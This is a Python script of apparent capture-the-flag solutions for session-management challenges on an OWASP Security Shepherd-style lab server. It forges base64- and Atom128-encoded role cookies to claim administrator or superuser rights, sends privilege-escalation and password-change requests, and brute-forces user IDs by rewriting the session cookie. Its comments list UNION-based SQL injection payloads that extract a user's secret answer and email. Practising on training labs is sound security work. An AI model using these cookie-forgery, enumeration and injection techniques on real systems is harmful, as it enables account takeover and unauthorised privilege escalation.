import requests
import base64
import Atom128Encoder


class SessionManagementExploits:

    @staticmethod
    def request_admin(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        print('response: ', response.text)

    @staticmethod
    def request_change_password(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        print('response: ', response.text)

    @staticmethod
    def fuzz_user_id(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        counter = 1
        user_id = '000000000000000' + str(counter)

        while 'not an Admin' in response.text:
            counter += 1
            print('Failed attempt with id: ' + user_id)

            if counter < 10:
                user_id = '000000000000000' + str(counter)
            else:
                user_id = '00000000000000' + str(counter)

            post_data['userId'] = user_id
            request_cookies['SubSessionID'] = base64.b64encode(base64.b64encode(user_id.encode())).decode()
            print('Trying new Cookie: ', request_cookies['SubSessionID'])
            response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)

        print('UserId found: ', user_id)
        print(response.text)


if __name__ == '__main__':
    # region Session Management 1
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }

    cookies = {
        'checksum': base64.b64encode(b'userRole=administrator').decode(),
        'JSESSIONID': '8FD2EB680E9B4F1147C56A57F9B2C98B',
        'token': '152983896188716118277470682191617805215',
        'JSESSIONID3': 'GRMIgXdfZcUPM4XMOJpeig=='
    }

    data = {
        'adminDetected': 'true',
        'returnPassword': 'true',
        'upgradeUserToAdmin': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a'

    print(cookies)

    SessionManagementExploits.request_admin(url, data, headers, cookies)
    # endregion

    # region Session Management 2
    # Just reset Password and look into response with owasp -> new password is in there cleartext
    # endregion

    # region Session Management 3
    cookies = {
        'current': base64.b64encode(base64.b64encode(b'admin')).decode(),
        'JSESSIONID': '8FD2EB680E9B4F1147C56A57F9B2C98B',
        'token': '152983896188716118277470682191617805215',
        'JSESSIONID3': 'GRMIgXdfZcUPM4XMOJpeig=='
    }

    data = {
        'newPassword': '12345678',
    }

    url = 'https://172.50.1.5:9443/challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a'

    print(cookies)

    SessionManagementExploits.request_change_password(url, data, headers, cookies)
    #endregion

    # region Session Management 4
    cookies = {
        'checksum': base64.b64encode(b'userRole=administrator').decode(),
        'current': base64.b64encode(base64.b64encode(b'admin')).decode(),
        'SubSessionID': base64.b64encode(base64.b64encode(b'0000000000000001')).decode(),
        'JSESSIONID': '8FD2EB680E9B4F1147C56A57F9B2C98B',
        'token': '152983896188716118277470682191617805215',
        'JSESSIONID3': 'GRMIgXdfZcUPM4XMOJpeig=='
    }

    data = {
        'userId': '0000000000000001',
        'useSecurity': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6'

    print(cookies)

    SessionManagementExploits.fuzz_user_id(url, data, headers, cookies)
    #endregion

    # region Session Managemenr 6
    # SQLi in Question Field:
    # " UNION Select username from users WHERE username="root";# => root user exists
    # " UNION Select secretanswer from users WHERE username="root";# => root users secret answer is Deerburn Hotel
    # " UNION Select useraddress from users WHERE username="root";# => root users email is elitehacker@shepherd.com
    # login with security question
    # endregion

    # region Session Management 8
    cookies = {
        'challengeRole': Atom128Encoder.encode('superuser'),
        'JSESSIONID': '8FD2EB680E9B4F1147C56A57F9B2C98B',
        'token': '152983896188716118277470682191617805215',
        'JSESSIONID3': 'GRMIgXdfZcUPM4XMOJpeig=='
    }

    data = {
        'returnUserRole': 'true',
        'returnPassword': 'true',
        'adminDetected': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/714d8601c303bbef8b5cabab60b1060ac41f0d96f53b6ea54705bb1ea4316334'

    print(cookies)

    SessionManagementExploits.request_admin(url, data, headers, cookies)
    #endregion


